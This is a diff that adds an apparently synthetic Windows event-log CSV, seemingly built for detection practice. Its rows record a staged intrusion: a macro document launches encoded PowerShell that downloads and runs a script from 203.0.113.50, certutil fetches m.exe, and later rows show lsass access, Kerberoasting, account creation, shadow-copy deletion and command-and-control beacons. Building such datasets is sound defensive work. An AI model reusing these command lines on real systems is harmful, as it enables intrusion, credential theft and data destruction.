@@ -1,0 +1,254 @@
+time,host,user,event_id,image,parent_image,command_line,target,source_ip,pid,ppid
+2026-03-01T09:00:15,WS02,carol,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T09:00:31,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1036,4
+2026-03-01T09:00:36,SRV01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.48.115:443,,1059,
+2026-03-01T09:00:51,WS01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.21.153:443,,1088,
+2026-03-01T09:01:11,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1102,900
+2026-03-01T09:01:18,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1108,4
+2026-03-01T09:01:29,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1141,4
+2026-03-01T09:01:45,WS02,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.119.164:443,,1163,
+2026-03-01T09:01:59,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1184,4
+2026-03-01T09:02:16,SRV01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.161.195:443,,1202,
+2026-03-01T09:02:29,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1212,4
+2026-03-01T09:02:57,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1217,4
+2026-03-01T09:03:13,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1224,4
+2026-03-01T09:03:32,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1232,4
+2026-03-01T09:03:42,SRV01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.138.87:443,,1241,
+2026-03-01T09:03:47,DC01,alice,4624,,,,3,10.0.0.11,,
+2026-03-01T09:04:02,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1248,4
+2026-03-01T09:04:17,WS02,alice,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1264,900
+2026-03-01T09:04:31,DC01,alice,4624,,,,3,10.0.0.12,,
+2026-03-01T09:04:38,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1294,4
+2026-03-01T09:04:48,WS01,bob,22,C:\Windows\explorer.exe,,,docs.example.net,,,
+2026-03-01T09:04:52,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1334,4
+2026-03-01T09:04:53,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1354,4
+2026-03-01T09:04:56,SRV01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.197.19:443,,1362,
+2026-03-01T09:05:16,WS01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1366,900
+2026-03-01T09:05:35,WS02,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1378,900
+2026-03-01T09:05:41,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1406,4
+2026-03-01T09:06:08,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1424,4
+2026-03-01T09:06:15,SRV01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.81.190:443,,1463,
+2026-03-01T09:06:18,SRV01,bob,22,C:\Windows\explorer.exe,,,docs.example.net,,,
+2026-03-01T09:06:35,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1469,4
+2026-03-01T09:07:02,WS02,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.200.66:443,,1499,
+2026-03-01T09:07:32,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1514,4
+2026-03-01T09:07:50,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1548,4
+2026-03-01T09:07:57,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1569,900
+2026-03-01T09:08:11,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1590,4
+2026-03-01T09:08:21,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1605,4
+2026-03-01T09:08:24,WS02,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1617,900
+2026-03-01T09:08:46,WS02,alice,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T09:09:05,SRV01,carol,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,1629,620
+2026-03-01T09:09:28,WS01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,1655,620
+2026-03-01T09:09:44,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1663,4
+2026-03-01T09:09:47,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1675,4
+2026-03-01T09:10:16,WS01,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,1681,620
+2026-03-01T09:10:38,SRV01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.174.91:443,,1690,
+2026-03-01T09:11:04,WS02,alice,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T09:11:17,WS01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1718,900
+2026-03-01T09:11:20,SRV01,alice,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1727,900
+2026-03-01T09:11:44,DC01,alice,4624,,,,3,10.0.0.16,,
+2026-03-01T09:12:03,WS02,bob,22,C:\Windows\explorer.exe,,,docs.example.net,,,
+2026-03-01T09:12:06,WS02,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,1765,620
+2026-03-01T09:12:22,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1774,4
+2026-03-01T09:12:38,DC01,alice,4624,,,,3,10.0.0.11,,
+2026-03-01T09:13:07,SRV01,carol,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T09:13:24,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1790,4
+2026-03-01T09:13:40,WS01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1822,900
+2026-03-01T09:13:47,WS01,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,1842,620
+2026-03-01T09:14:00,SRV01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.102.226:443,,1859,
+2026-03-01T09:14:05,WS01,carol,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:14:28,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1865,4
+2026-03-01T09:14:37,WS01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.57.116:443,,1899,
+2026-03-01T09:14:53,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,1936,4
+2026-03-01T09:15:20,SRV01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.231.83:443,,1944,
+2026-03-01T09:15:42,WS01,bob,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:16:03,SRV01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1967,900
+2026-03-01T09:16:18,SRV01,alice,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,1996,900
+2026-03-01T09:16:44,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.136.61:443,,2009,
+2026-03-01T09:17:05,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2019,4
+2026-03-01T09:17:08,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2046,900
+2026-03-01T09:17:17,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2080,4
+2026-03-01T09:17:35,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2114,4
+2026-03-01T09:18:00,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2135,4
+2026-03-01T09:18:17,WS02,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2172,900
+2026-03-01T09:18:20,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2190,4
+2026-03-01T09:18:35,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2222,4
+2026-03-01T09:18:48,WS01,carol,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:19:14,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2258,900
+2026-03-01T09:19:18,WS02,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2275,4
+2026-03-01T09:19:25,SRV01,carol,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:19:43,DC01,bob,4624,,,,3,10.0.0.14,,
+2026-03-01T09:19:55,WS02,bob,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:20:13,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2300,4
+2026-03-01T09:20:20,WS02,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2305,620
+2026-03-01T09:20:42,WS01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.88.137:443,,2330,
+2026-03-01T09:21:11,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2367,4
+2026-03-01T09:21:30,SRV01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.225.243:443,,2402,
+2026-03-01T09:21:40,SRV01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.224.135:443,,2441,
+2026-03-01T09:21:57,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2478,900
+2026-03-01T09:22:25,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2506,4
+2026-03-01T09:22:43,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2519,4
+2026-03-01T09:22:57,SRV01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2535,900
+2026-03-01T09:22:58,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2563,620
+2026-03-01T09:23:16,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2592,620
+2026-03-01T09:23:19,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2606,620
+2026-03-01T09:23:28,SRV01,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2635,620
+2026-03-01T09:23:42,WS01,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,2660,620
+2026-03-01T09:23:56,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2676,4
+2026-03-01T09:24:19,SRV01,alice,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:24:20,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2694,4
+2026-03-01T09:24:28,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2720,4
+2026-03-01T09:24:56,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2731,4
+2026-03-01T09:25:19,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2747,4
+2026-03-01T09:25:46,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2777,4
+2026-03-01T09:26:14,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2794,4
+2026-03-01T09:26:21,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2831,900
+2026-03-01T09:26:29,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,2843,900
+2026-03-01T09:26:58,SRV01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.92.81:443,,2867,
+2026-03-01T09:27:03,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.99.228:443,,2877,
+2026-03-01T09:27:17,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.132.100:443,,2887,
+2026-03-01T09:27:38,WS02,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.64.52:443,,2916,
+2026-03-01T09:28:00,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2956,4
+2026-03-01T09:28:21,WS02,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2992,4
+2026-03-01T09:28:47,DC01,carol,4624,,,,3,10.0.0.13,,
+2026-03-01T09:29:12,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,2998,4
+2026-03-01T09:29:28,SRV01,carol,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,3038,620
+2026-03-01T09:29:34,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3055,4
+2026-03-01T09:29:53,WS01,bob,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:29:56,DC01,alice,4624,,,,3,10.0.0.17,,
+2026-03-01T09:30:13,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3086,4
+2026-03-01T09:30:14,WS02,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3113,4
+2026-03-01T09:33:01,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:36:05,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:36:20,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:40:01,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:40:57,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:41:48,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:43:37,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:45:38,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:47:15,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:50:29,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T09:50:41,WS01,SYSTEM,10,C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe,,,C:\Windows\System32\lsass.exe,,,
+2026-03-01T09:51:11,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3142,4
+2026-03-01T09:51:31,WS01,alice,1,C:\Program Files\Microsoft Office\WINWORD.EXE,C:\Windows\explorer.exe,WINWORD.EXE invoice.docm,,,3158,3142
+2026-03-01T09:51:35,WS01,alice,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Microsoft Office\WINWORD.EXE,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=,,,3172,3158
+2026-03-01T09:52:16,WS01,alice,13,C:\Users\alice\AppData\Local\Temp\upd.exe,,,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater,,3195,
+2026-03-01T09:52:36,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:52:38,WS01,alice,1,C:\Windows\System32\cmd.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe /c whoami /all,,,3212,3172
+2026-03-01T09:52:57,WS01,alice,1,C:\Windows\System32\certutil.exe,C:\Windows\System32\cmd.exe,certutil -urlcache -f http://203.0.113.50/m.exe C:\Users\Public\m.exe,,,3241,3212
+2026-03-01T09:53:15,WS01,alice,1,C:\Users\Public\tool.exe,C:\Windows\System32\wbem\wmiprvse.exe,tool.exe,,,3256,3212
+2026-03-01T09:53:28,WS01,alice,10,C:\Users\Public\m.exe,,,C:\Windows\System32\lsass.exe,,3264,
+2026-03-01T09:53:34,DC01,alice,4769,,,,svc_sql0 0x17,10.0.0.21,,
+2026-03-01T09:53:35,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:53:39,DC01,alice,4769,,,,svc_sql1 0x17,10.0.0.21,,
+2026-03-01T09:53:46,DC01,alice,4769,,,,svc_sql2 0x17,10.0.0.21,,
+2026-03-01T09:53:49,DC01,alice,4769,,,,svc_sql3 0x17,10.0.0.21,,
+2026-03-01T09:53:52,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:00,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:02,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:05,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:08,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:13,DC01,admin,4625,,,,3,10.0.0.99,,
+2026-03-01T09:54:22,DC01,admin,4624,,,,3,10.0.0.99,,
+2026-03-01T09:54:38,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:54:46,SRV01,alice,4624,,,,3,10.0.0.21,,
+2026-03-01T09:55:08,SRV02,alice,4624,,,,3,10.0.0.21,,
+2026-03-01T09:55:34,SRV03,alice,4624,,,,3,10.0.0.21,,
+2026-03-01T09:55:39,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:55:45,FILE01,alice,4624,,,,3,10.0.0.21,,
+2026-03-01T09:56:19,DC01,alice,4624,,,,3,10.0.0.21,,
+2026-03-01T09:56:26,DC01,alice,4720,,,,backup$,,,
+2026-03-01T09:56:31,WS01,alice,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,yagqqrv98607g2e9cy.top,,,
+2026-03-01T09:56:40,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:56:42,WS01,alice,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,y4k58d150s7ztx7s4r.top,,,
+2026-03-01T09:56:49,WS01,alice,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,ssbapck0yduzdueo14.top,,,
+2026-03-01T09:56:57,WS01,alice,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,pc7g3jphd03hndw7jh.top,,,
+2026-03-01T09:57:04,WS01,alice,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2i03q0x7isip4h6t6w.top,,,
+2026-03-01T09:57:24,FILE01,alice,1,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\cmd.exe,vssadmin delete shadows /all /quiet,,,3285,900
+2026-03-01T09:57:43,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:57:45,SRV01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,3301,900
+2026-03-01T09:58:02,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3320,4
+2026-03-01T09:58:23,SRV01,alice,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:58:24,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3351,4
+2026-03-01T09:58:33,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3389,4
+2026-03-01T09:58:42,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:58:51,WS01,alice,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T09:59:07,DC01,carol,4624,,,,3,10.0.0.17,,
+2026-03-01T09:59:31,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3424,4
+2026-03-01T09:59:44,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T09:59:46,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.229.208:443,,3441,
+2026-03-01T09:59:58,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3454,4
+2026-03-01T10:00:23,WS01,carol,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.166.75:443,,3493,
+2026-03-01T10:00:42,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,3520,620
+2026-03-01T10:00:47,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:01:00,WS01,bob,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T10:01:27,WS01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,3555,900
+2026-03-01T10:01:30,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3559,4
+2026-03-01T10:01:33,WS02,alice,22,C:\Windows\explorer.exe,,,docs.example.net,,,
+2026-03-01T10:01:43,SRV01,bob,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,3583,620
+2026-03-01T10:01:45,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:01:55,WS01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3607,4
+2026-03-01T10:02:21,WS01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.142.113:443,,3644,
+2026-03-01T10:02:46,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:02:51,WS02,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3673,4
+2026-03-01T10:03:18,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3700,4
+2026-03-01T10:03:37,WS02,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3729,4
+2026-03-01T10:03:49,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:03:55,WS02,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.188.205:443,,3757,
+2026-03-01T10:03:58,WS01,carol,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,3772,900
+2026-03-01T10:04:16,WS02,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.113.133:443,,3779,
+2026-03-01T10:04:37,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3784,4
+2026-03-01T10:04:52,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:05:03,WS02,alice,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,3807,900
+2026-03-01T10:05:27,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3828,4
+2026-03-01T10:05:31,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3841,4
+2026-03-01T10:05:47,SRV01,carol,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,3859,620
+2026-03-01T10:05:52,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:06:13,SRV01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.201.90:443,,3884,
+2026-03-01T10:06:31,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3919,4
+2026-03-01T10:06:54,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:06:59,SRV01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.23.106:443,,3945,
+2026-03-01T10:07:20,WS01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.237.246:443,,3983,
+2026-03-01T10:07:46,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,3987,4
+2026-03-01T10:07:51,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:07:54,WS01,bob,22,C:\Windows\explorer.exe,,,www.example.com,,,
+2026-03-01T10:08:16,DC01,alice,4624,,,,3,10.0.0.16,,
+2026-03-01T10:08:33,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4018,4
+2026-03-01T10:08:49,DC01,bob,4624,,,,3,10.0.0.10,,
+2026-03-01T10:08:50,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:09:14,WS02,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4031,4
+2026-03-01T10:09:44,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.8.150:443,,4065,
+2026-03-01T10:09:47,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:09:56,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4080,4
+2026-03-01T10:10:16,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4114,4
+2026-03-01T10:10:29,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,4135,620
+2026-03-01T10:10:45,WS01,bob,1,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig /all,,,4174,900
+2026-03-01T10:10:46,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
